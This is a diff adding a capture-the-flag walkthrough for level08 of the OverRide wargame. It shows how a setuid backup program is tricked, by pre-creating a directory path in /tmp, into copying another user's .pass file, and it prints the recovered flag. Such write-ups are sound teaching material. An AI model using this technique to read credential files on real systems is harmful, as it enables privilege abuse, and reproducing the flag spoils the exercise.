@@ -1,4 +1,38 @@
+We have a directory called "backup" and an executable that require a filename as argument:
+
+level08@OverRide:~$ ./level08 
+Usage: ./level08 filename
+ERROR: Failed to open (null)
+
+
+Lets try it with a random file:
+
+level08@OverRide:~$ ./level08 .profile 
+level08@OverRide:~$ cat backups/.profile 
+# ~/.profile: executed by the command interpreter for login shells.
+# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
+
+Seems like it is creating a copy of it in the backups directory.
+Maybe we can give him the .pass file, and read the copy ?
+
+level08@OverRide:~$ ./level08 /home/users/level09/.pass
+ERROR: Failed to open ./backups//home/users/level09/.pass
+
+The program launch an error because it cant open the new .pass file. This is the part of the code that we cant pass:
+
+fd = open(dest, 193, 432);
+if ( fd < 0 )
+{
+  printf("ERROR: Failed to open %s%s\n", "./backups/", argv[1]);
+  exit(1);
+}
+
+Maybe we could create the directory he is trying to open so he can actually create the .pass file:
 level08@OverRide:/tmp$ mkdir -p backups//home/users/level09/
+
+Now we try again:
 level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
+
+It created a .pass file !
 level08@OverRide:/tmp$ cat backups/home/users/level09/.pass 
 fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
